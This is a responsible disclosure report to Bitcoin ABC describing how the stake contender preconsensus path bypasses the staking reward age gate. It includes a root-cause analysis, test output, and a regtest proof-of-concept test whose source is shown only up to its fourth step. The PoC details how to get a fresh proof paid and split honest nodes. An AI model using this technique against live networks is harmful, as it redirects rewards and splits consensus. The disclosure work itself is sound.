# Responsible disclosure: the staking reward age gate is bypassed on the paid winner, so a proof inside the gate gets paid and honest nodes split

**To:** security@bitcoinabc.org
**Component:** Bitcoin ABC node, avalanche staking rewards and stake contender preconsensus
**Severity:** High. A consensus split between honest nodes running the same software, plus the staking reward going to a proof the age gate was written to exclude.
**Reproduced on:** regtest only. Per the disclosure policy I did not run anything against mainnet or testnet.
**Build:** local build of the `master` source tree at commit `28c310db31248991c41559c1cd9e057bcc577594`, pristine node binary (no C++ changes)

---

## Contents

- [1. Impact](#1-impact)
- [2. Root cause](#2-root-cause)
- [3. Why this is a bug, not normal behavior](#3-why-this-is-a-bug-not-normal-behavior)
- [4. How to reproduce (regtest only)](#4-how-to-reproduce-regtest-only)
- [5. Proof of concept: full test source](#5-proof-of-concept-full-test-source)
- [6. Verbatim test output](#6-verbatim-test-output)
- [7. Preconditions and limitations](#7-preconditions-and-limitations)
- [8. Suggested fix](#8-suggested-fix)
- [9. Reporter](#9-reporter)

---

To the Bitcoin ABC security team,

Two different code paths decide who gets paid the staking reward for a block. One of them has an age gate that keeps a recently registered proof out of the paid slot. The other one, the stake contender preconsensus path, does not: it accepts and finalizes the best ranked contender with no age check at all, and that contender then overwrites the paid winner. So a proof the age gate is supposed to exclude ends up getting paid, and any node that does not have that proof parks the block while a node that does accepts it. Two honest nodes on the same software, different tips.

The PoC below uses a proof that is exactly 10 minutes old and already avalanche finalized, so its age is the only thing the gated path still has against it. It runs on regtest with a real avalanche quorum on both sides of the split and an unmodified node binary.

## 1. Impact

On eCash the staking reward is 10% of every block reward, and a block is only valid if it pays the winner avalanche picked. The selection code has an age gate so a proof has to have been known to the network for about an hour before it can be that winner. The point of the gate is that you should not be able to register a proof and get it paid straight away.

That gate can be skipped. The gated path throws out any proof younger than 30 minutes, and it will not put a proof younger than 60 minutes in the paid slot. The contender path finalizes the best ranked contender without looking at age at all, and once it finalizes it rewrites the whole winner list. So the proof the gate rejected still gets paid. Two things go wrong from there:

* The reward gets redirected. The 10% for that block goes to a proof the gate was built to keep out. All the attacker has to do is register a proof inside the window and win the reward rank draw, and a proof with several times the stake wins that draw often.
* Honest nodes split. A node whose quorum finalized the new proof's contender pays it and treats the block as valid. A node that has not finalized it keeps the age gated winner and parks the block with `policy-bad-staking-reward`. Now two nodes running the same code are on different tips, and the only input that differs is how long a proof has been registered. From there you get the usual consequences of a split: orphaned blocks, reorgs, and stalled block acceptance on whichever side is missing the proof.

## 2. Root cause

Two paths pick the winner. Only one of them has the age gate.

**Path A, age gated, `PeerManager::selectStakingRewardWinner`.**

This is the path that builds the winner list ([src/avalanche/peermanager.cpp#L1053-L1160](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1053-L1160)). With `Peer::DANGLING_TIMEOUT = 15min` ([src/avalanche/peermanager.h#L100](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.h#L100)) the gate is two checks:

* any candidate must be registered more than twice `DANGLING_TIMEOUT` (30 minutes) before the reference time, otherwise it is skipped ([src/avalanche/peermanager.cpp#L1097-L1098](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1097-L1098));
* the paid winner (the first compliant proof) must be registered more than four times `DANGLING_TIMEOUT` (60 minutes) before the reference time ([src/avalanche/peermanager.cpp#L1143-L1145](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1143-L1145)).

The stated purpose is to "not account for proofs more recent than the previous block or lacking node connected" ([src/avalanche/peermanager.cpp#L1060-L1065](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1060-L1065)).

**Path B, no age gate, the stake contender preconsensus path.**

A proof lands in the stake contender cache as soon as it is registered, with no age check ([src/avalanche/peermanager.cpp#L1454-L1466](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1454-L1466)). When the node sets contender status for its local winners it finalizes the age gated ones, but it also accepts the single best ranked contender overall, and there is no age check on that one ([src/avalanche/peermanager.cpp#L1506-L1540](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1506-L1540)):

```cpp
// Treat the highest ranking contender similarly to local winners except
// that it is not automatically included in the winner set (unless it
// happens to be selected as a local winner).
if (stakeContenderCache.getPollableContenders(prevblockhash, maxPollable,
                                              pollableContenders) > 0) {
    // Accept the highest ranking contender. This is a no-op if the highest
    // ranking contender is already the local winner.
    stakeContenderCache.accept(pollableContenders[0]);
    ...
```

Once accepted, `StakeContenderCache::getVoteStatus` returns 0 (ACCEPTED) for that contender ([src/avalanche/stakecontendercache.cpp#L140-L168](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/stakecontendercache.cpp#L140-L168)), so the node votes ACCEPTED on it in avalanche. When the quorum finalizes the contender, `PeerManager::finalizeStakeContender` sets `IN_WINNER_SET` and recomputes `getWinners`, which sorts accepted first then by reward rank ([src/avalanche/peermanager.cpp#L1477-L1488](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1477-L1488), [src/avalanche/stakecontendercache.cpp#L228-L283](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/stakecontendercache.cpp#L228-L283)). Then `Processor::finalizeStakeContender` overwrites the block's whole winner list via `insert_or_assign` ([src/avalanche/processor.cpp#L1106-L1126](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/processor.cpp#L1106-L1126), overwrite at [src/avalanche/processor.cpp#L1056-L1068](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/processor.cpp#L1056-L1068)). No `registration_time` check exists anywhere on this path.

**The payout and the park.** The miner pays `winners[0]` ([src/node/miner.cpp#L186-L194](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/node/miner.cpp#L186-L194)). The validator parks a block whose staking payout is not in its own winner list, with `policy-bad-staking-reward` ([src/policy/block/stakingrewards.cpp#L34-L70](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/policy/block/stakingrewards.cpp#L34-L70)).

Both paths decide the same thing, the proof that ends up at `winners[0]`, so they ought to apply the same eligibility test. Path A does: to be `winners[0]` a proof has to be registered more than 60 minutes before the previous block, so a fresh proof cannot be paid. Path B does the same job, accepting the best ranked contender at [src/avalanche/peermanager.cpp#L1530](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1530) and letting it become `winners[0]` once the quorum finalizes it, but it applies no age check at all. So the test that should hold on both sides is only enforced on one of them, and the operation still goes through: the finalized contender overwrites `winners[0]`, the miner pays it, and it is a proof Path A would not consider for any winner position. Same slot, two paths, one of them missing the gate.

## 3. Why this is a bug, not normal behavior

The comment at [src/avalanche/peermanager.cpp#L1060-L1065](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1060-L1065) says the intent outright: do not account for proofs more recent than the previous block. Path A does that. Path B reaches the same paid slot and does not. The comment at the acceptance site even says accepting the highest ranking contender "is a no-op if the highest ranking contender is already the local winner," so the author clearly expected the best contender and the age gated local winner to be the same proof in normal operation. The bug is the case that was not covered: when a recently registered high stake proof out ranks the age gated winner, they are different proofs, and the best contender is accepted, finalized and paid anyway.

Worth being precise about one thing here, because it is the first objection I would raise myself. Path A rejects a proof for two separate reasons at [src/avalanche/peermanager.cpp#L1097-L1098](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/peermanager.cpp#L1097-L1098): the proof needs `hasFinalized` set, and it needs to be old enough. Path B checks neither. So the PoC satisfies the first one before doing anything else, waiting until the proof is avalanche finalized on the victim node before the clock is touched, which leaves the age as the only thing Path A still has against it. That kills the obvious confound. This is not an unvetted proof getting paid because nobody had voted on it yet; it is a fully finalized proof getting paid in a slot the gate reserves for older proofs.

The other objection is that preconsensus exists to let the network override a local guess, so a node that parks has simply not caught up. That does not work here. Each node polls its own quorum, and `StakeContenderCache::getVoteStatus` returns UNKNOWN for a contender the node has never seen, so a node whose quorum lacks the proof never finalizes that contender and finalizes the block as rejected instead. Both sides settle on opposite answers for the same block and stay there. That is a split, not propagation lag. The age gate was the thing preventing it, since nothing counts as payable until it has been registered long enough that you can reasonably expect the whole network to hold it. Path B throws that guarantee away and keeps the parking.

None of this is cosmetic or an accounting detail. `getStakingRewardWinners` feeds both the miner payout ([src/node/miner.cpp#L186-L194](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/node/miner.cpp#L186-L194)) and the block validity check ([src/policy/block/stakingrewards.cpp#L34-L70](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/policy/block/stakingrewards.cpp#L34-L70)). One node finalizes the new contender, the other does not, and the same block is then valid for one and parked by the other. Same software, same base quorum, different tips.

Two more things back this up. First, the read side has no second gate to save it: `getWinners` and `getPollableContenders` ([src/avalanche/stakecontendercache.cpp#L170-L253](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/avalanche/stakecontendercache.cpp#L170-L253)) do no age or validity re-check when the winner list is read back; they just sort accepted first, then by reward rank. So once Path B has accepted and finalized the contender, nothing downstream reconsiders its age. The Path B description above is the whole story.

**The park is durable, not propagation lag (tested directly).** Even if you assume the parking node has simply not caught up and will heal the moment the proof arrives, that is not what happens. I ran the PoC through to the park, then bridged the two partitions and delivered the new proof to node1 over the real P2P avaproof path, the same way a new staker's node would broadcast it (RPC injection would register the proof but never poll it, so only the P2P path puts it into the vote records). node1 receives the proof, and then nothing heals:

```python
        self.log.info(
            "HEAL VARIANT: bridge the partitions AFTER the park. P_new "
            "gossips to node1's side over P2P (proof relay is unconditional). "
            "Question: does node1 finalize the contender, flip its winner "
            "list, and heal (unpark+connect the split block) -- or does the "
            "split persist?"
        )
        self.connect_nodes(1, 2)  # node1 <-> Q0[0] (P2P, both directions)

        # Deliver P_new to node1 over the genuine P2P avaproof receive path
        # (models the fresh staker's node broadcasting into node1's
        # partition). RPC injection would register-but-never-poll it; only
        # the P2P path enters the proof into the vote records.
        from test_framework.messages import msg_avaproof
        heal_peer = node1.add_p2p_connection(P2PInterface())
        msg = msg_avaproof()
        msg.proof = p_new_proof
        heal_peer.send_without_ping(msg)
        heal_peer.sync_with_ping()

        def node1_knows_p_new():
            try:
                node1.getrawavalancheproof(p_new_id_hex)
                return True
            except JSONRPCException:
                return False

        self.wait_until(node1_knows_p_new, timeout=120)
        self.log.info("  -> node1 now knows P_new (post-park)")

        def node1_winner_flipped():
            try:
                r = node1.getstakingreward(split_prev)
                return int(r[0]["proofid"], 16) == p_new_proof.proofid
            except Exception:
                return False

        healed_winner = False
        try:
            self.wait_until(node1_winner_flipped, timeout=180)
            healed_winner = True
        except AssertionError:
            pass
        self.log.info(f"  -> node1 winner list flipped to P_new: {healed_winner}")

        healed_tip = False
        try:
            self.wait_until(
                lambda: node1.getbestblockhash() == split_block, timeout=180
            )
            healed_tip = True
        except AssertionError:
            pass
        tip_entry = [t for t in node1.getchaintips() if t["hash"] == split_block]
        tip_status = tip_entry[0]["status"] if tip_entry else "absent"
        self.log.info(
            f"  -> node1 tip healed to split block: {healed_tip}; "
            f"split-block tip status now: {tip_status}"
        )
        self.log.info(
            f"HEAL RESULT: winner_flipped={healed_winner} tip_healed={healed_tip} "
            f"status={tip_status}. If tip_healed is False, the split survives "
            "even after the proof arrives -- the park is durable, not lag."
        )
```

Output:

```
2026-08-19T18:55:15.230000Z TestFramework (INFO): STEP 9: node0 mines the P_new-paying block; node1 parks it
2026-08-19T18:55:15.255000Z TestFramework (INFO):   -> node1 and Q1[0] both parked the split block
2026-08-19T18:55:15.428000Z TestFramework (INFO):   -> node1 votes PARKED on the split block
2026-08-19T18:55:15.428000Z TestFramework (INFO): HEAL VARIANT: bridge the partitions AFTER the park. P_new gossips to node1's side over P2P (proof relay is unconditional). Question: does node1 finalize the contender, flip its winner list, and heal (unpark+connect the split block) -- or does the split persist?
2026-08-19T18:55:15.591000Z TestFramework (INFO):   -> node1 now knows P_new (post-park)
2026-08-19T18:56:15.606000Z TestFramework (INFO):   -> node1 winner list flipped to P_new: False
2026-08-19T18:57:00.654000Z TestFramework (INFO):   -> node1 tip healed to split block: False; split-block tip status now: parked
2026-08-19T18:57:00.654000Z TestFramework (INFO): HEAL RESULT: winner_flipped=False tip_healed=False status=parked. If tip_healed is False, the split survives even after the proof arrives -- the park is durable, not lag.
2026-08-19T18:57:01.423000Z TestFramework (INFO): Tests successful
```

node1 learns the proof immediately after the park, but over the next 60 seconds, which is roughly 6,000 poll rounds at the 10 ms loop, its winner list for that previous block never updates, the block stays parked, and the tip never reconnects. The contender and winner state for a previous block hash is frozen when the block connects; a proof that shows up afterwards does not re-open it. So this is a durable split, not transient lag. On a live network both sides would keep mining on their own tip, which is exactly the chain split.

## 4. How to reproduce (regtest only)

The test runs a real avalanche quorum on both sides of the split. Twenty real `bitcoind` processes: a victim miner (node0), an honest validator (node1), and two separate quorums of 9 real nodes each. Nothing is mocked, and the harness never sends a contender vote. node0's paid winner flips on its own: node0's avalanche event loop polls its real quorum, and the quorum answers ACCEPTED from its own C++.

The new proof goes to exactly one quorum node and reaches node0 by real P2P proof gossip, which is what a new staker's proof does anyway. That detail is load bearing for the evidence. `sendavalancheproof` registers and relays a proof but never calls `Processor::reconcileOrFinalize` ([src/rpc/avalanche.cpp#L1640-L1653](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/rpc/avalanche.cpp#L1640-L1653)), so a proof injected locally over RPC never enters the vote records and can never reach `hasFinalized`. Only the P2P receive path polls it ([src/net_processing.cpp#L9450](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L9450)). Because it arrives by gossip, the test can assert node0 really has finalized the proof, using `getrawavalancheproof(...)["finalized"]`, which is `Peer::hasFinalized` ([src/rpc/avalanche.cpp#L1337-L1340](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/rpc/avalanche.cpp#L1337-L1340)). Then it advances the clock 10 minutes, mines a transition block so the previous block timestamp carries the advanced time, and asserts the measured registration age is exactly 600 seconds.

Run from the repo root against a built tree:

```bash
python3 test/functional/abc_p2p_avalanche_staking_reward_age_gate_realquorum.py
```

Companion evidence in the tree:

```
test/functional/abc_p2p_avalanche_staking_reward_age_gate.py       # same split with a mock quorum
```

The topology is not arbitrary, the code forces it. Avalanche proof relay is unconditional (`fRelayProofs = !!m_avalanche`, [src/net_processing.cpp#L2352](https://github.com/Bitcoin-ABC/bitcoin-abc/blob/28c310db31248991c41559c1cd9e057bcc577594/src/net_processing.cpp#L2352)), so a block relay only connection will not stop proof gossip. The only way to keep the new proof out of node1's view for any length of time is to put node1 and its quorum in a partition with no path to a node that holds it. node0 and its quorum hold the proof and finalize its contender; node1 and its quorum never see it and keep the age gated winner. Both quorums share the same base proof keys, so both compute the same age gated winner for a given previous block. That is deliberate: it means the split can only be attributed to the new proof's registration age, not to the two sides having different proof sets. Since the partitions are isolated, the shared proof ids never conflict. node0's block reaches node1 only via `submitblock`, the same way an ordinary block would arrive over the network.

## 5. Proof of concept: full test source

`test/functional/abc_p2p_avalanche_staking_reward_age_gate_realquorum.py`:

```python
#!/usr/bin/env python3
# Copyright (c) 2026 The Bitcoin developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
"""Regtest PoC: the staking-reward registration-age gate is bypassed on the
paid winner position by the stake-contender preconsensus path -- with a FULLY
REAL avalanche quorum on BOTH sides of the split.

This is the real-quorum upgrade of
abc_p2p_avalanche_staking_reward_age_gate.py. The mock version proved the
consensus split with two victim nodes whose 16-member quorums were mock Python
P2P interfaces answering scripted contender votes. Here BOTH quorums are real
bitcoind nodes, each started with its own -avaproof/-avamasterkey, and the flip
of node0's paid winner happens ORGANICALLY: node0's own avalanche event loop
polls the real quorum Q0 and Q0 answers ACCEPTED from its own C++ code
(PeerManager::setContenderStatusForLocalWinners accepting pollableContenders[0]
at peermanager.cpp:1530, StakeContenderCache::getVoteStatus returning 0 at
stakecontendercache.cpp:151). No AvalancheVote for a contender is ever sent by
the harness.

The defect (two independent winner-selection paths, only one age-gated):

  Path A (age gated): PeerManager::selectStakingRewardWinner
  (src/avalanche/peermanager.cpp:1053-1178) skips any proof registered less
  than 30 minutes before the previous block time (line 1097-1098) and only
  picks winners[0] among proofs older than 60 minutes (line 1143-1146). Its
  stated purpose (line 1060-1065) is to "not account for proofs more recent
  than the previous block or lacking node connected".

  Path B (NO age gate): PeerManager::setContenderStatusForLocalWinners
  (peermanager.cpp:1506-1540) finalizes the age-gated local winners (line 1514)
  BUT ALSO accept()s the single highest-reward-rank contender overall at line
  1530 with no age check. StakeContenderCache::getVoteStatus
  (stakecontendercache.cpp:140-168) then returns 0 (ACCEPTED) for it, so the
  node votes ACCEPTED. When the quorum FINALIZES that contender,
  PeerManager::finalizeStakeContender (peermanager.cpp:1477-1488) sets
  IN_WINNER_SET and recomputes getWinners (stakecontendercache.cpp:228-283,
  accepted-first then reward-rank), and Processor::finalizeStakeContender
  (processor.cpp:1106-1126) overwrites the block's winner list via
  insert_or_assign (processor.cpp:1052/1066).

The miner pays winners[0] (src/node/miner.cpp:186-194). The validator only
checks membership in the winners list (src/policy/block/stakingrewards.cpp:50)
and PARKS the block on a miss (src/validation.cpp:3078).

Why two isolated partitions (see spec): proof relay is UNCONDITIONAL
(Peer.m_proof_relay is created whenever avalanche is enabled,
net_processing.cpp:2352), so a block-relay-only connection does NOT stop proof
gossip. To keep P_new out of node1's view durably, node1 and its quorum Q1 must
be in a network partition with NO P2P path to any node holding P_new. A node
votes ACCEPTED on P_new's contender only if it has P_new registered and ranks
it #1; a node without P_new returns UNKNOWN/rejected and never finalizes it.

  - node0-partition = {node0 (victim/miner)} + Q0 (K real quorum nodes) -- ALL
    hold P_new -> Q0 votes ACCEPTED on P_new's contender ORGANICALLY -> node0's
    own avalanche loop finalizes it -> node0 pays P_new.
  - node1-partition = {node1 (honest validator)} + Q1 (K real quorum nodes) --
    NEVER see P_new -> node1 keeps the age-gated winner W -> node1 (and Q1) PARK
    node0's block.
  - Q0[i] and Q1[i] share the SAME base proof B_i (identical
    -avaproof/-avamasterkey) so both partitions compute the SAME age-gated
    winner W for a given previous block; the split is attributable ONLY to
    P_new's registration age, not to a different proof set. Because the two
    partitions are isolated, the duplicate proofids never conflict.

Timing: base proofs are aged to ~101 minutes (compliant with the 60min target
AND older than the 90min early-break threshold, so selectStakingRewardWinner
returns a single winner). P_new is registered EXACTLY 10 minutes before the
reference time of the split block. 10 minutes is a deliberate choice:

  - it is inside the 30 minute skip threshold (peermanager.cpp:1097-1098), so
    Path A refuses P_new outright and can never place it in the winners list at
    any position;
  - it is below Peer::DANGLING_TIMEOUT (15 minutes, peermanager.h:100), so
    cleanupDanglingProofs (peermanager.cpp:510-562) does not drop P_new even
    though no node presents it in an avahello (node_count == 0). This is what
    bounds the measured age in a functional test to under 15 minutes;
  - P_new is avalanche-FINALIZED before the clock is advanced, asserted via
    getrawavalancheproof(...)["finalized"], which is exactly Peer::hasFinalized
    (rpc/avalanche.cpp:1337-1340). That is Path A's OTHER precondition at
    peermanager.cpp:1097, so satisfying it leaves the registration age as the
    ONLY reason Path A excludes P_new -- precisely the gate Path B skips.

Quorums are formed and the base proofs are synced/finalized in REAL time first;
only then is mocktime jumped to age them. The avalanche event loop runs on
CScheduler steady_clock (processor.cpp:35) independent of mocktime, so real
polling and organic finalization proceed under the freeze.

Test PASSES = with a fully real quorum on each side, node0's own avalanche loop
(polling the real Q0) finalizes P_new's contender and pays a proof registered 10
minutes ago -- fully finalized, but inside the age gate -- as winners[0]; node1
and its real quorum Q1, which never saw P_new, keep the age-gated winner and
PARK the block -- a consensus/chain split driven purely by proof-registration
timing plus the missing age gate on the best-contender acceptance. A control
block paying the age-gated winner W is accepted by node1, proving the split is
caused by the bug, not the harness.
"""

import math
import time
from decimal import Decimal

from test_framework.address import key_to_p2pkh
from test_framework.authproxy import JSONRPCException
from test_framework.avatools import (
    avalanche_proof_from_hex,
    create_coinbase_stakes,
    get_ava_p2p_interface_no_handshake,
    get_proof_ids,
)
from test_framework.key import ECKey, ECPubKey
from test_framework.messages import (
    MSG_BLOCK,
    AvalancheContenderVoteError,
    AvalancheVote,
    AvalancheVoteError,
    hash256,
    ser_uint256,
)
from test_framework.p2p import P2PInterface
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import assert_equal, uint256_hex
from test_framework.wallet_util import bytes_to_wif

# A node only votes definitively once isQuorumEstablished() (processor.cpp:838),
# which requires getNodeCount() >= 8 among its avalanche peers. node0/node1 have
# no local proof, so they contribute no ava-node to a quorum member; a quorum
# node therefore sees only its K-1 mesh peers, so the minimum workable quorum is
# K = 9 (each mesh member sees 8). Bump to 12/16 if quorum formation is flaky.
K = 9

# Mirror the mock PoC's args. Staking preconsensus is ON by default and MUST
# stay on (the whole Path B mechanism depends on it) -- do NOT pass
# -avalanchestakingpreconsensus=0.
BASE_ARGS = [
    "-avalanchestakingrewards=1",
    "-avaproofstakeutxodustthreshold=1000000",
    "-avaproofstakeutxoconfirmations=1",
    "-avacooldown=0",
    "-avaminquorumstake=0",
    "-avaminavaproofsnodecount=0",
    "-avastalevotethreshold=500",
    "-avastalevotefactor=1",
    "-simplegbt",
]


class AvalancheStakingRewardAgeGateRealQuorumTest(BitcoinTestFramework):
    def set_test_params(self):
        self.setup_clean_chain = True
        # node0 (victim/miner), node1 (honest validator), then K quorum nodes
        # for each partition.
        self.num_nodes = 2 + 2 * K
        # Whitelist localhost peers so the (many) intra-partition connections do
        # not flap under load. There is no cross-partition link, so this cannot
        # leak P_new to node1's side.
        self.noban_tx_relay = True
        # Independent list copies: TestNode.start() appends -bind to the list it
        # is given, so shared references would corrupt sibling nodes.
        self.extra_args = [list(BASE_ARGS) for _ in range(self.num_nodes)]
        self.supports_cli = False
        self.rpc_timeout = 240

    def setup_network(self):
        # Wire the topology by hand in run_test so the two partitions stay
        # strictly isolated. Just start the nodes here.
        self.setup_nodes()

    def run_test(self):
        node0 = self.nodes[0]
        node1 = self.nodes[1]
        q0_idx = list(range(2, 2 + K))
        q1_idx = list(range(2 + K, 2 + 2 * K))
        Q0 = [self.nodes[i] for i in q0_idx]
        Q1 = [self.nodes[i] for i in q1_idx]

        def new_payout_address():
            key = ECKey()
            key.generate()
            return key_to_p2pkh(key.get_pubkey().get_bytes())

        def build_proof(heights, payout_address):
            # Wallet-free proof construction (this build has no wallet): stake
            # the given coinbase heights, controlled by node0's deterministic
            # coinbase key, under a fresh master key with the given payout.
            blockhashes = [node0.getblockhash(h) for h in heights]
            stakes = create_coinbase_stakes(
                node0, blockhashes, node0.get_deterministic_priv_key().key
            )
            privkey = ECKey()
            privkey.generate()
            proof_hex = node0.buildavalancheproof(
                42, 0, bytes_to_wif(privkey.get_bytes()), stakes, payout_address
            )
            return privkey, avalanche_proof_from_hex(proof_hex)

        def make_contender_id(prevblockhash, proofid):
            return int.from_bytes(
                hash256(ser_uint256(int(prevblockhash, 16)) + ser_uint256(proofid)),
                "little",
            )

        def proof_reward_rank(contender_id, proof_score):
            return (256.0 - math.log2(contender_id)) / proof_score

        # -------------------------------------------------------------------
        # STEP 0: build the shared initial chain on every node, then build the
        # K base proofs (one distinct coinbase each) plus the attacker proof
        # P_new (4 coinbases, ~4x score).
        # -------------------------------------------------------------------
        self.log.info("STEP 0: mine the shared base chain and distribute it")
        self.generate(node0, 100, sync_fun=self.no_op)

        # Temporarily star-connect every node to node0 to sync the base chain,
        # then tear the star down. No proof exists yet, so nothing can leak.
        for i in range(1, self.num_nodes):
            self.connect_nodes(i, 0)
        self.sync_blocks(timeout=120)
        for i in range(1, self.num_nodes):
            self.disconnect_nodes(i, 0)

        base_heights = [[h] for h in range(1, K + 1)]
        p_new_heights = list(range(K + 1, K + 5))

        self.log.info(f"Build {K} base proofs (shared Q0[i]/Q1[i]) and P_new")
        base_proofs = []
        base_keys = []
        for hs in base_heights:
            pk, proof = build_proof(hs, new_payout_address())
            base_keys.append(pk)
            base_proofs.append(proof)
        base_proofids = {p.proofid for p in base_proofs}

        p_new_priv, p_new_proof = build_proof(p_new_heights, new_payout_address())
        assert p_new_proof.proofid not in base_proofids
        # P_new stakes 4 coinbases: ~4x the score of any single-coinbase base
        # proof, giving it the best reward rank with high probability.
        assert p_new_proof.get_score() >= 4 * base_proofs[0].get_score()

        # -------------------------------------------------------------------
        # STEP 1: restart each quorum node under its base proof. Q0[i] and
        # Q1[i] get the SAME proof B_i, so both partitions compute the same
        # age-gated winner W for any given previous block.
        # -------------------------------------------------------------------
        self.log.info("STEP 1: restart the 2*K quorum nodes under their proofs")
        for slot in range(K):
            privkey = base_keys[slot]
            proof = base_proofs[slot]
            avaproof_arg = f"-avaproof={proof.serialize().hex()}"
            avamaster_arg = f"-avamasterkey={bytes_to_wif(privkey.get_bytes())}"
            for idx in (q0_idx[slot], q1_idx[slot]):
                self.restart_node(
                    idx,
                    extra_args=list(self.extra_args[idx])
                    + [avaproof_arg, avamaster_arg],
                )

        # -------------------------------------------------------------------
        # STEP 2: wire the two strictly-isolated partitions. Each quorum node
        # first gets a throwaway inbound peer so canShareLocalProof() latches
        # (processor.cpp:924-936) and its proof is advertised in avahello. Then
        # a full mesh within each partition (each member sees K-1 >= 8 ava
        # peers -> isQuorumEstablished) plus node<->quorum links.
        # -------------------------------------------------------------------
        self.log.info("STEP 2: wire node0+Q0 and node1+Q1 as isolated partitions")
        for q in Q0 + Q1:
            q.add_p2p_connection(P2PInterface())

        for group in (q0_idx, q1_idx):
            for a in range(len(group)):
                for b in range(a):
                    self.connect_nodes(group[a], group[b])
        for qi in q0_idx:
            self.connect_nodes(0, qi)
        for qi in q1_idx:
            self.connect_nodes(1, qi)

        # Sanity: no cross-partition link exists. Compare full subversion
        # strings (each test node appends its index) -- exact match only, since
        # "testnode1" is a substring of "testnode10".
        subver = {
            i: self.nodes[i].getnetworkinfo()["subversion"]
            for i in range(self.num_nodes)
        }
        p0_subver = {subver[i] for i in [0] + q0_idx}
        p1_subver = {subver[i] for i in [1] + q1_idx}
        for i, forbidden in [(i, p1_subver) for i in [0] + q0_idx] + [
            (i, p0_subver) for i in [1] + q1_idx
        ]:
            for peer in self.nodes[i].getpeerinfo():
                assert peer["subver"] not in forbidden, (
                    f"cross-partition link on node {i}: {peer['subver']}"
                )

        # -------------------------------------------------------------------
        # STEP 3: establish both quorums and finalize the base proofs in REAL
        # time (mocktime not frozen yet). A single block connected on every
        # node triggers updatedBlockTip -> local proof registration and the
        # delayed-avahello flush so peers learn each other's proofs and form
        # node associations (avoiding flaky/dangling proofs later).
        # -------------------------------------------------------------------
        self.log.info("STEP 3: form quorums and finalize base proofs organically")
        blk = node0.getblock(self.generate(node0, 1, sync_fun=self.no_op)[0], 0)
        node1.submitblock(blk)
        self.sync_blocks([node0] + Q0, timeout=120)
        self.sync_blocks([node1] + Q1, timeout=120)

        # Booster: broadcast every base proof to every node in its own
        # partition so registration is fast and deterministic. This models an
        # ordinary proof broadcast; node associations still come from the real
        # avahello handshakes above.
        for proof in base_proofs:
            proof_hex = proof.serialize().hex()
            for n in [node0] + Q0:
                try:
                    n.sendavalancheproof(proof_hex)
                except JSONRPCException:
                    pass
            for n in [node1] + Q1:
                try:
                    n.sendavalancheproof(proof_hex)
                except JSONRPCException:
                    pass

        for n in self.nodes:
            self.wait_until(
                lambda n=n: n.getavalancheinfo()["ready_to_poll"] is True,
                timeout=300,
                check_interval=0.5,
            )
        self.log.info("  -> every node reports ready_to_poll")

        def node_finalized_all_base(n):
            for pid in base_proofids:
                try:
                    if not n.getrawavalancheproof(uint256_hex(pid))["finalized"]:
                        return False
                except JSONRPCException:
                    return False
            return True

        for n in self.nodes:
            self.wait_until(
                lambda n=n: node_finalized_all_base(n),
                timeout=600,
                check_interval=0.5,
            )
        self.log.info(f"  -> all {self.num_nodes} nodes finalized all {K} base proofs")

        # Every base proof must have a connected node on node0 and node1 so it
        # is neither flaky nor dangling once mocktime jumps forward.
        def all_base_have_nodes(n):
            for pid in base_proofids:
                try:
                    info = n.getavalanchepeerinfo(uint256_hex(pid))
                except JSONRPCException:
                    return False
                if not info or len(info[0]["node_list"]) == 0:
                    return False
            return True

        for n in (node0, node1):
            self.wait_until(lambda n=n: all_base_have_nodes(n), timeout=120)

        # -------------------------------------------------------------------
        # STEP 4: age the base proofs. Freeze mocktime +91min so every base
        # proof is older than the 90min early-break threshold (single winner).
        # P_new is registered at this frozen value in STEP 6 and then aged to
        # exactly 10 minutes by the second jump in STEP 6b.
        # -------------------------------------------------------------------
        self.log.info("STEP 4: jump mocktime +91min to age the base proofs")
